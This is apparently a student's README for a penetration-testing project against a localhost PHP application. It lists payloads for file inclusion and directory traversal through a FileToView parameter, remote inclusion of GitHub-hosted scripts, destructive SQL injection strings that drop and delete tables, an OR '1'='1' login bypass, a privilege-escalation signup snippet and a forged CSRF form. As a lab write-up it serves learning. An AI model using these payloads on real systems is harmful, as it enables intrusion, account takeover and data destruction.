# Penetration Testing Main Project
I will host all payloads useed to execute penetration testing tests against the localhost web application.

## Index.php

### Information Disclosure

When you create the ```secureappdev``` database in the beginning, via the index.php page, you can see that the username of 'admin' and 'user1' are exposed. Even worse, the passwords associated with those users are also exposed. Meaning I am able to sign-in to the either the 'admin' or 'user1' account via the portal.

![index](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/03871d07-9e1c-4551-8f08-6c9993338fda)


## Auth2.php

### Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```
### File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```
### XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```
### NMAP Scan Results
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/nmap.txt
```
<br/>
I was able to host my old assignment on Github and reference the public-hosted .PHP source page via the same ```FileToView``` parameter used to read the yellow.txt file stored in the same directory. The FileToView attribute doesn't just allow for reflective cross-site scripting, but you can see I am able to do directory traversal to the CSS directory as well as reading sensitive data from files such as SQL database which is also located in the same directory:
<br/>

![hosted](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/68013c1a-6a7f-4032-b1e3-2fb508263cef)

### Accessing unsecured Admin Portal (Redirects and Forwards):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## Register.php
This is the signup page - ```http://localhost/Project23/register.php```

### SQL Injection
This query includes the commented noise ```--AbC1xyz```, which meets the specified criteria of being at least 8 characters long, containing a mix of uppercase and lowercase letters, and including a digit for the password sanitation. The commented noise itself will not affect the execution of the SQL query but adds some complexity to the string. I do not want the noise to affect the SQL query should ultimately achieves SQL Injection. Here's a breakdown of the query: <br/>

```
'; DROP TABLE loginevents; --AbC1xyz'
```

1. ```';``` This part closes the original SQL statement (if any) and starts a new one. <br/>
2. ```DROP TABLE loginevents;``` This is a SQL command that deletes the specified table (```loginevents``` in this case) from the database. <br/>
3. ```--``` This is a SQL comment that comments out the rest of the original query. It helps to avoid syntax errors that might occur due to the injection.

```
'; DELETE FROM loginevents; --AbC1xyz'
```

```
'; DELETE FROM sapusers; --AbC1xyz'
```

```
qwerwqr'
```

In either case, a ```password_hash``` is used to securely hash the user's password before storing it in the database. <br/>
Additionally, a prepared statement is used to prevent SQL injection. Always hash passwords and avoid inserting user input directly into SQL queries.

![sql](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/2cfabb27-2b60-4529-b22a-ad9e7bf16377)

It's still concerning if the input is being directly stored in the SQL database without proper sanitation, as it could lead to SQL injection vulnerabilities. <br/>
To avoid this, we should always use parameterized queries or prepared statements to handle user input in SQL queries.

### Privilege escalation via compromised signup page

You'll notice that the new registration redirect is virtually identical, only for 2 small changes.
- I added the word "fake" in the html output
- register2.php webpage has the form action set to ```includes/signup.inc2.php``` instead of ```signup.inc.php```

Link to source code:
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/signup2.php

Within ```signup.inc2.php``` the real magic happens. The registration process is checking if the provided username ```uid``` contains only alphabetical characters and if the username is not already in use. The password is hashed before being stored in the database. There's no need to make changes to any of this stuff. <br/>
<br/>
To register a user with ```user_admin``` set to ```1```, I just needed to modify the script to include the ```user_admin``` field in the SQL query. <br/>
This was was sufficient since there were no additional checks or validations in place to prevent me from constructing a privilege escalation script.

```
            // If the user already exists, prevent them from signing up
            if ($result->num_rows > 0) {
                $_SESSION['register'] = "Error.";
                header("Location: ../index.php");
                exit();
            } else {
                $hashedPWD = $pwd;
                $isAdmin = 1; // Set 'user_admin' to 1 for admin user
```

Link to source code:
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/reset.inc2.php

![admin](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/40f3a136-09be-4018-a62d-e13763df242f)




## Change.php

In the provided PHP code, the CSRF token is generated and stored in the ```$_SESSION [ 'csrf' ] ``` variable. <br/> 
When a user submits the form, a token is included in a hidden input field named "csrf-token" and sent along with the form data. <br/> 
<br/> 
To find out the CSRF token value, you can inspect the HTML source code of the page or use browser developer tools. Follow these steps:

1. Right-click on the webpage and select "Inspect" or "Inspect Element" in your browser.
2. Navigate to the "Elements" or "HTML" tab in the developer tools.
3. Locate the form element containing the CSRF token. It should look something like this:

```
<form class="signup-form" action="includes/reset.inc.php" method="GET">
    <!-- Other form fields -->
    <input type="hidden" name="csrf-token" value="csrf_token_here"/>
    <!-- Submit button and other elements -->
</form>
```
I found the value attribute of the hidden input field named "csrf-token." <br/>
The value within the double quotes is our CSRF token. <br/>

## Crafting a CSRF Attack via Fake PHP webpage
I wrote a webpage called ```change2.php``` that looks like ```change.php```. <br/>
However, you'll notice that I included the CSRF token in the input type 'hidden'

```
<input type="hidden" name="csrf-token" value="5f165e25a63d2081a8ed0e90093960587ea2e23b00359b577268b251d62d33e9">
```

The source code of my fake webpage can be accessed here: <br/>
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/change2.php

Proof of accessing the CSRF Token in the webpage:
![csrf](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/1683b11a-ba2a-4c40-868c-af8203fe01b2)

I'm my fake form, I'm using a HTTP ```POST``` request instead of a ```GET``` request as was seen in the original form. <br/>
The reason for this is I want to be able to send malicious data to SQL database, or at least allow for an insecure redirect.

```
<form class="signup-form" action="includes/reset.inc2.php" method="POST">
<input type="password" name="old" value="" placeholder="Old Password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" required>            
<input type="password" name="new" value="" placeholder="New Password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" required>
<input type="password" name="new_confirm" value="" placeholder="Confirm New Password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" required>
<button type="submit" name="reset" value="yes">Reset</button>
<!-- Hidden input field for the CSRF token -->
<input type="hidden" name="csrf-token" value="5f165e25a63d2081a8ed0e90093960587ea2e23b00359b577268b251d62d33e9">
</form>
```

You can access the fake password reset page ```change2.php``` source code here: <br/>
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/change2.php

I also created a duplicate reset.inc page ```reset.inc2.php``` that removes any redirects, only the one for logout which should denote a successful password reset:
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/reset.inc2.php

## SQL Injection

I have nothing prepared for this yet.

## NMAP Simulations

I will investigate the findings of the NMAP scan on the IP address 127.0.0.1 below: <br/>
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/nmap.txt

![nmap](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/5ef55aa8-37c8-4a8f-ac95-3396652511b8)

## ZAP Simulations

Looks like every page on the XAMPP webserver running on localhost has a clear ```absence of Anti-CSRF Tokens``` according to Zap intensive scan.

![anti-csrf](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/8bf4d191-f672-4464-832f-1f64547cfd20)


## Login Page

Changed the colour to red on-load:
```
<span style="color: red; background-color: green; font-size: 30px;">Nigel Douglas</span><span style="color: red;">Nigel Douglas</span>
```

![colour](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/b87dfa2c-29b8-4fea-9987-f48acd94e826)


Video successfully loaded
```
<video width="50%" height="50%" controls><source src="http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/WhatCarCanYouGetForAGrand.mp4" type="video/mp4">XSS Vulnerability Identified by Nigel Douglas.</video>
```

![video](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/f90febea-54a8-48c2-8f62-e910244f6ef8)

#### SQL Injection
```
<form method="get" action=""><input type="submit" name="createDatabase" value="Create / Reset Database & Table"></form>
```

```
select * FROM users WHERE username = 'fdsg' AND password = 'sfjg'
```

The username You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''qwerwqr''' at line 1 and password could not be authenticated at this moment.
```
qwerwqr' OR '1'='1'
```
